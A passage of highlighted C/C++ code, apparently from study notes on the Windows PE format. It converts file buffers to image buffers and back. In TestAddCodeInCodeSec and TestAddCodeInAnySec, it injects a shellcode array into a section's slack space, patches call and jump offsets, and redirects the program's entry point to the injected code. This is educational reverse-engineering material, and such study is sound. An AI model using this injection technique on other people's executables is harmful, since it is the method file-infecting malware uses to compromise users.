&gt; (DWORD)pSectionHeader-&gt;VirtualAddress &amp;&amp; (DWORD)MemOffset &lt; (DWORD)pSectionHeader-&gt;VirtualAddress + pSectionHeader-&gt;Misc.VirtualSize)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tthisVA = pSectionHeader-&gt;VirtualAddress;</span><br><span class=\"line\">\t\t\tthisFile = pSectionHeader-&gt;PointerToRawData;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//printf(&quot;thisVA:%X\\n&quot;,thisVA);  //C000</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tpSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pSectionHeader + IMAGE_SIZEOF_SECTION_HEADER);</span><br><span class=\"line\">\t\tpFileHeader-&gt;NumberOfSections--;</span><br><span class=\"line\">\t\tNumOfSec++;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//printf(&quot;NumOfSec:%d\\n&quot;, NumOfSec+1);</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tthisoffset = MemOffset - thisVA; <span class=\"comment\">//C234-C000 = 234;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//printf(&quot;thisoffset:%X\\n&quot;,thisoffset);</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tFilePos = thisoffset + thisFile; <span class=\"comment\">// 234 + AC00 = AE34</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//printf(&quot;FilePos:%X\\n&quot;,FilePos);</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> FilePos;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">DWORD <span class=\"title\">CopyFileBufferToImageBuffer</span><span class=\"params\">(IN LPVOID pFileBuffer, OUT LPVOID* pImageBuffer)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\tvoid *memset(void *s,int c,size_t n)</span></span><br><span class=\"line\"><span class=\"comment\">\t将已开辟内存空间 s 的首 n 个字节的值设为值 c（给空间初始化）</span></span><br><span class=\"line\"><span class=\"comment\">\tvoid *memcpy(void *dest, const void *src, size_t n);</span></span><br><span class=\"line\"><span class=\"comment\">\t用来将src地址处的内容拷贝n个字节的数据至目标地址dest指向的内存中去  ,函数返回指向dest的指针</span></span><br><span class=\"line\"><span class=\"comment\">\t*/</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//定义PE header</span></span><br><span class=\"line\">\tPIMAGE_DOS_HEADER pDosHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_NT_HEADERS pNTHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_FILE_HEADER pFileHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_OPTIONAL_HEADER pOptionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_SECTION_HEADER pSectionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;</span><br><span class=\"line\">\tpNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class=\"line\">\tpFileHeader = (PIMAGE_FILE_HEADER)(<span class=\"built_in\">sizeof</span>(pNTHeader-&gt;Signature) + (DWORD)pNTHeader);</span><br><span class=\"line\">\tpOptionHeader = (PIMAGE_OPTIONAL_HEADER)((DWORD)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class=\"line\">\tpSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//计算共复制了多少</span></span><br><span class=\"line\">\tDWORD TotalSize = <span class=\"number\">0</span>;\t</span><br><span class=\"line\">\t<span class=\"comment\">//为imagebuffer开辟堆空间</span></span><br><span class=\"line\">\tLPVOID pTempImageBuffer = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tpTempImageBuffer = (LPVOID)<span class=\"built_in\">malloc</span>(pOptionHeader-&gt;SizeOfImage);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (pTempImageBuffer == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tcout &lt;&lt; <span class=\"string\">&quot;为imagebuffer申请内存失败&quot;</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//初始化</span></span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(pTempImageBuffer, <span class=\"number\">0</span>, pOptionHeader-&gt;SizeOfImage);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//复制headers , 从filebuffer 到 imagebuffer</span></span><br><span class=\"line\">\t<span class=\"built_in\">memcpy</span>(pTempImageBuffer, pFileBuffer, pOptionHeader-&gt;SizeOfHeaders);</span><br><span class=\"line\">\tTotalSize += pOptionHeader-&gt;SizeOfHeaders;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//文件和内存对齐不一样的情况</span></span><br><span class=\"line\">\t<span class=\"comment\">//if (pOptionHeader-&gt;FileAlignment &lt; pOptionHeader-&gt;SectionAlignment)</span></span><br><span class=\"line\">\t<span class=\"comment\">//&#123;</span></span><br><span class=\"line\">\t<span class=\"comment\">//\tint memcal = pOptionHeader-&gt;SizeOfHeaders / pOptionHeader-&gt;SectionAlignment;    //if header in file = 1234 , 1234/1000 , then 1000*2 in image</span></span><br><span class=\"line\">\t<span class=\"comment\">//\tpImageBuffer += memcal * pOptionHeader-&gt;SectionAlignment;</span></span><br><span class=\"line\">\t<span class=\"comment\">//\t//memset(pImageBuffer + pOptionHeader-&gt;SizeOfHeaders, 0, memcal * pOptionHeader-&gt;SectionAlignment);</span></span><br><span class=\"line\">\t<span class=\"comment\">//&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//循环复制节表</span></span><br><span class=\"line\">\t<span class=\"comment\">//while (pFileHeader-&gt;NumberOfSections &gt; 0)</span></span><br><span class=\"line\">\t<span class=\"comment\">//&#123;</span></span><br><span class=\"line\">\t<span class=\"comment\">//\tmemcpy((LPVOID)((DWORD)pTempImageBuffer + pSectionHeader-&gt;VirtualAddress), (LPVOID)((DWORD)pFileBuffer + pSectionHeader-&gt;PointerToRawData), pSectionHeader-&gt;SizeOfRawData);</span></span><br><span class=\"line\">\t<span class=\"comment\">//\tpSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pSectionHeader + IMAGE_SIZEOF_SECTION_HEADER);</span></span><br><span class=\"line\">\t<span class=\"comment\">//\tTotalSize += pSectionHeader-&gt;SizeOfRawData;</span></span><br><span class=\"line\">\t<span class=\"comment\">//\tpFileHeader-&gt;NumberOfSections--;</span></span><br><span class=\"line\">\t<span class=\"comment\">//&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; pFileHeader-&gt;NumberOfSections; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">memcpy</span>((LPVOID)((DWORD)pTempImageBuffer + pSectionHeader[i].VirtualAddress), (LPVOID)((DWORD)pFileBuffer + pSectionHeader[i].PointerToRawData), pSectionHeader[i].SizeOfRawData);</span><br><span class=\"line\">\t\tTotalSize += pSectionHeader[i].SizeOfRawData;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t*pImageBuffer = pTempImageBuffer;</span><br><span class=\"line\">\t<span class=\"comment\">//return TotalSize;</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> TotalSize;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">DWORD <span class=\"title\">CopyImageBufferToNewBuffer</span><span class=\"params\">(LPVOID pImageBuffer, LPVOID *pNewBuffer)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//LPVOID pFileBuffer = (LPVOID)OpenFile();</span></span><br><span class=\"line\">\t<span class=\"comment\">//pMemBuffer = CopyFileBufferToImageBuffer(pFileBuffer);</span></span><br><span class=\"line\">\t<span class=\"comment\">//LPVOID pFileBuffer = NULL;</span></span><br><span class=\"line\">\t<span class=\"comment\">//pMemBuffer = CopyFileBufferToImageBuffer(pFileBuffer,&amp;pFileBuffer);</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//定义PE header</span></span><br><span class=\"line\">\tPIMAGE_DOS_HEADER pDosHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_NT_HEADERS pNTHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_FILE_HEADER pFileHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_OPTIONAL_HEADER pOptionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_SECTION_HEADER pSectionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpDosHeader = (PIMAGE_DOS_HEADER)pImageBuffer;</span><br><span class=\"line\">\tpNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pImageBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class=\"line\">\tpFileHeader = (PIMAGE_FILE_HEADER)(<span class=\"built_in\">sizeof</span>(pNTHeader-&gt;Signature) + (DWORD)pNTHeader);</span><br><span class=\"line\">\tpOptionHeader = (PIMAGE_OPTIONAL_HEADER)((DWORD)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class=\"line\">\tpSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//为newbuffer开辟堆空间</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> secNum = pFileHeader-&gt;NumberOfSections;  <span class=\"comment\">//节的数量</span></span><br><span class=\"line\">\tDWORD pointerdata = <span class=\"number\">0</span>;    <span class=\"comment\">//当前节的PointerToRawData</span></span><br><span class=\"line\">\tDWORD sizedata = <span class=\"number\">0</span>;   <span class=\"comment\">//当前节的SizeOfRawData</span></span><br><span class=\"line\">\t<span class=\"comment\">//DWORD FileAlig = pOptionHeader-&gt;FileAlignment;   //文件对齐</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//计算最后一个节所在位置+大小，用于后续开辟空间</span></span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\twhile (secNum &gt; 0)</span></span><br><span class=\"line\"><span class=\"comment\">\t&#123;</span></span><br><span class=\"line\"><span class=\"comment\">\t\tif (secNum == 1)</span></span><br><span class=\"line\"><span class=\"comment\">\t\t&#123;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\tpointerdata = pSectionHeader-&gt;PointerToRawData;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\tsizedata = pSectionHeader-&gt;SizeOfRawData;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t//cout &lt;&lt;  pointerdata &lt;&lt; &quot; &quot; &lt;&lt; sizedata &lt;&lt; &quot;\\n&quot;;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t&#125;</span></span><br><span class=\"line\"><span class=\"comment\">\t\tpSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pSectionHeader + IMAGE_SIZEOF_SECTION_HEADER);</span></span><br><span class=\"line\"><span class=\"comment\">\t\tsecNum--;</span></span><br><span class=\"line\"><span class=\"comment\">\t&#125;</span></span><br><span class=\"line\"><span class=\"comment\">\t*/</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> m=<span class=\"number\">0</span>;m&lt;pFileHeader-&gt;NumberOfSections;m++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(m == pFileHeader-&gt;NumberOfSections<span class=\"number\">-1</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tpointerdata = pSectionHeader[m].PointerToRawData;</span><br><span class=\"line\">\t\t\tsizedata = pSectionHeader[m].SizeOfRawData;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//开辟内存</span></span><br><span class=\"line\">\t*pNewBuffer = (LPVOID)<span class=\"built_in\">malloc</span>(pointerdata + sizedata);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (*pNewBuffer == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tcout &lt;&lt; <span class=\"string\">&quot;为imagebuffer申请内存失败\\n&quot;</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//初始化</span></span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(*pNewBuffer, <span class=\"number\">0</span>, pointerdata + sizedata);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//复制headers , 从filebuffer 到 imagebuffer</span></span><br><span class=\"line\">\t<span class=\"built_in\">memcpy</span>(*pNewBuffer, pImageBuffer, pOptionHeader-&gt;SizeOfHeaders);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//复制section</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; pFileHeader-&gt;NumberOfSections; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">memcpy</span>((LPVOID)((DWORD)(*pNewBuffer) + pSectionHeader[i].PointerToRawData), (LPVOID)((DWORD)pImageBuffer + pSectionHeader[i].VirtualAddress), pSectionHeader[i].SizeOfRawData);</span><br><span class=\"line\">\t\t<span class=\"comment\">//memcpy((LPVOID)((DWORD)(*pNewBuffer) + pSectionHeader[i].PointerToRawData), (LPVOID)((DWORD)pImageBuffer + pSectionHeader[i].VirtualAddress), pSectionHeader[i].SizeOfRawData);</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> pointerdata + sizedata;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">bool</span> <span class=\"title\">MemeryToFile</span><span class=\"params\">(IN LPVOID pMemBuffer, IN <span class=\"type\">size_t</span> size, OUT LPSTR lpszFile)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tFILE *fp = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tfp = <span class=\"built_in\">fopen</span>(lpszFile, <span class=\"string\">&quot;wb+&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (fp == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">fwrite</span>(pMemBuffer, size, <span class=\"number\">1</span>, fp);</span><br><span class=\"line\">\t<span class=\"built_in\">fclose</span>(fp);</span><br><span class=\"line\">\tfp = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">TestAddCodeInCodeSec</span><span class=\"params\">(IN LPSTR lpszFile, OUT LPSTR lpszOutFile)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tLPVOID pFileBuffer = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tLPVOID pImageBuffer = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tLPVOID pNewBuffer = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t<span class=\"comment\">//从filebuffer - imagebuffer</span></span><br><span class=\"line\">\tDWORD fileLen = <span class=\"built_in\">ReadPEFile</span>(lpszFile, &amp;pFileBuffer);</span><br><span class=\"line\">\tDWORD copySizeFromFile = <span class=\"built_in\">CopyFileBufferToImageBuffer</span>(pFileBuffer, &amp;pImageBuffer);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tPIMAGE_DOS_HEADER pDosHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_NT_HEADERS pNTHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_FILE_HEADER pFileHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_OPTIONAL_HEADER pOptionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_SECTION_HEADER pSectionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpDosHeader = (PIMAGE_DOS_HEADER)pImageBuffer;</span><br><span class=\"line\">\tpNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pImageBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class=\"line\">\tpFileHeader = (PIMAGE_FILE_HEADER)(<span class=\"built_in\">sizeof</span>(pNTHeader-&gt;Signature) + (DWORD)pNTHeader);</span><br><span class=\"line\">\tpOptionHeader = (PIMAGE_OPTIONAL_HEADER)((DWORD)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class=\"line\">\tpSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//cout &lt;&lt; sizeof(shellcode)/sizeof(shellcode[0]) &lt;&lt; &quot;\\n&quot;;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//判断空闲区大小是否足够添加shellcode</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(pSectionHeader-&gt;SizeOfRawData - pSectionHeader-&gt;Misc.VirtualSize &lt; <span class=\"built_in\">sizeof</span>(shellcode)/<span class=\"built_in\">sizeof</span>(shellcode[<span class=\"number\">0</span>]))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tcout &lt;&lt; <span class=\"string\">&quot;空闲区不够!!\\n&quot;</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">free</span>(pFileBuffer);</span><br><span class=\"line\">\t\t<span class=\"built_in\">free</span>(pImageBuffer);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//加shellcode的位置</span></span><br><span class=\"line\">\tPBYTE addPos = (PBYTE)((DWORD)pImageBuffer + pSectionHeader-&gt;VirtualAddress + pSectionHeader-&gt;Misc.VirtualSize);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//复制shellcode</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//cout &lt;&lt; (PBYTE)addPos &lt;&lt; &quot;\\n&quot;;</span></span><br><span class=\"line\">\t<span class=\"built_in\">memcpy</span>(addPos ,shellcode, <span class=\"built_in\">sizeof</span>(shellcode)/<span class=\"built_in\">sizeof</span>(shellcode[<span class=\"number\">0</span>]));</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//修正E8</span></span><br><span class=\"line\">\t<span class=\"comment\">//DWORD e8 = MessageAddr - (pOptionHeader-&gt;ImageBase + ((DWORD)(addPos+0xD) - (DWORD)pImageBuffer));</span></span><br><span class=\"line\">\tDWORD e8 = MessageAddr - (pOptionHeader-&gt;ImageBase + pSectionHeader-&gt;VirtualAddress + pSectionHeader-&gt;Misc.VirtualSize +<span class=\"number\">8</span> +<span class=\"number\">5</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%X\\n&quot;</span>,e8);</span><br><span class=\"line\">\t<span class=\"built_in\">memcpy</span>(addPos+<span class=\"number\">9</span>,&amp;e8,<span class=\"built_in\">sizeof</span>(DWORD));</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//修正E9</span></span><br><span class=\"line\">\t<span class=\"comment\">//DWORD e9 = pOptionHeader-&gt;ImageBase + pOptionHeader-&gt;AddressOfEntryPoint - (pOptionHeader-&gt;ImageBase + ((DWORD)(addPos+0xD+5) - (DWORD)pImageBuffer));</span></span><br><span class=\"line\">\tDWORD e9 = pOptionHeader-&gt;ImageBase + pOptionHeader-&gt;AddressOfEntryPoint - (pOptionHeader-&gt;ImageBase + pSectionHeader-&gt;VirtualAddress + pSectionHeader-&gt;Misc.VirtualSize + <span class=\"number\">13</span> + <span class=\"number\">5</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%X\\n&quot;</span>,e9);</span><br><span class=\"line\">\t<span class=\"built_in\">memcpy</span>(addPos+<span class=\"number\">14</span>,&amp;e9,<span class=\"built_in\">sizeof</span>(DWORD));</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//修正OEP</span></span><br><span class=\"line\">\t<span class=\"comment\">//pOptionHeader-&gt;AddressOfEntryPoint = (DWORD)addPos - (DWORD)pImageBuffer;</span></span><br><span class=\"line\">\tpOptionHeader-&gt;AddressOfEntryPoint = pSectionHeader-&gt;VirtualAddress + pSectionHeader-&gt;Misc.VirtualSize;</span><br><span class=\"line\"></span><br><span class=\"line\">\tDWORD size = <span class=\"built_in\">CopyImageBufferToNewBuffer</span>(pImageBuffer, &amp;pNewBuffer);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">bool</span> isSucc = <span class=\"built_in\">MemeryToFile</span>(pNewBuffer, size, lpszOutFile);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (isSucc == <span class=\"literal\">true</span>) cout &lt;&lt; <span class=\"string\">&quot;Success\\n&quot;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> cout &lt;&lt; <span class=\"string\">&quot;woshishabi\\n&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">TestAddCodeInAnySec</span><span class=\"params\">(DWORD NumOfSec, IN LPSTR lpszFile, OUT LPSTR lpszOutFile)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tLPVOID pFileBuffer = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tLPVOID pImageBuffer = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tLPVOID pNewBuffer = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t<span class=\"comment\">//从filebuffer - imagebuffer</span></span><br><span class=\"line\">\tDWORD fileLen = <span class=\"built_in\">ReadPEFile</span>(lpszFile, &amp;pFileBuffer);</span><br><span class=\"line\">\tDWORD copySizeFromFile = <span class=\"built_in\">CopyFileBufferToImageBuffer</span>(pFileBuffer, &amp;pImageBuffer);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tPIMAGE_DOS_HEADER pDosHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_NT_HEADERS pNTHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_FILE_HEADER pFileHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_OPTIONAL_HEADER pOptionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_SECTION_HEADER pSectionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpDosHeader = (PIMAGE_DOS_HEADER)pImageBuffer;</span><br><span class=\"line\">\tpNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pImageBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class=\"line\">\tpFileHeader = (PIMAGE_FILE_HEADER)(<span class=\"built_in\">sizeof</span>(pNTHeader-&gt;Signature) + (DWORD)pNTHeader);</span><br><span class=\"line\">\tpOptionHeader = (PIMAGE_OPTIONAL_HEADER)((DWORD)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class=\"line\">\tpSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//cout &lt;&lt; sizeof(shellcode)/sizeof(shellcode[0]) &lt;&lt; &quot;\\n&quot;;</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(NumOfSec &gt; pFileHeader-&gt;NumberOfSections)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tcout &lt;&lt; <span class=\"string\">&quot;超出最大节数量\\n&quot;</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//判断空闲区大小是否足够添加shellcode</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(pSectionHeader[NumOfSec<span class=\"number\">-1</span>].SizeOfRawData - pSectionHeader[NumOfSec<span class=\"number\">-1</span>].Misc.VirtualSize &lt; <span class=\"built_in\">sizeof</span>(shellcode)/<span class=\"built_in\">sizeof</span>(shellcode[<span class=\"number\">0</span>]))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tcout &lt;&lt; <span class=\"string\">&quot;空闲区不够!!\\n&quot;</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">free</span>(pFileBuffer);</span><br><span class=\"line\">\t\t<span class=\"built_in\">free</span>(pImageBuffer);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//加shellcode的位置</span></span><br><span class=\"line\">\tPBYTE addPos = (PBYTE)((DWORD)pImageBuffer + pSectionHeader[NumOfSec<span class=\"number\">-1</span>].VirtualAddress + pSectionHeader[NumOfSec<span class=\"number\">-1</span>].Misc.VirtualSize);</span><br><span class=\"line\">    <span class=\"comment\">//PVOID codeBegin = (PBYTE)((pFileOptionHeader-&gt;SizeOfHeaders) + (DWORD)ImageBuffer + pFileSectionHeader-&gt;Misc.VirtualSize);</span></span><br><span class=\"line\">\t<span class=\"comment\">//复制shellcode</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//cout &lt;&lt; (PBYTE)addPos &lt;&lt; &quot;\\n&quot;;</span></span><br><span class=\"line\">\t<span class=\"built_in\">memcpy</span>(addPos ,shellcode, <span class=\"built_in\">sizeof</span>(shellcode)/<span class=\"built_in\">sizeof</span>(shellcode[<span class=\"number\">0</span>]));</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//修正E8</span></span><br><span class=\"line\">\tDWORD e8 = MessageAddr - (pOptionHeader-&gt;ImageBase + pSectionHeader[NumOfSec<span class=\"number\">-1</span>].VirtualAddress + pSectionHeader[NumOfSec<span class=\"number\">-1</span>].Misc.VirtualSize +<span class=\"number\">8</span> +<span class=\"number\">5</span>);</span><br><span class=\"line\">\t<span class=\"comment\">//DWORD e8 = MessageAddr - (pOptionHeader-&gt;ImageBase + ((DWORD)(addPos+0xD) - (DWORD)pImageBuffer));</span></span><br><span class=\"line\">\t<span class=\"comment\">//DWORD e8 = ((DWORD)MessageAddr - (pOptionHeader-&gt;ImageBase + ((DWORD)((DWORD)addPos + 0xD) - (DWORD)pImageBuffer)));</span></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%X\\n&quot;</span>,e8);</span><br><span class=\"line\">\t<span class=\"built_in\">memcpy</span>(addPos+<span class=\"number\">9</span>,&amp;e8,<span class=\"built_in\">sizeof</span>(DWORD));</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//修正E9</span></span><br><span class=\"line\">\t<span class=\"comment\">//DWORD e9 = (pOptionHeader-&gt;ImageBase + pOptionHeader-&gt;AddressOfEntryPoint) - (pOptionHeader-&gt;ImageBase + ((DWORD)(addPos+0xD+5) - 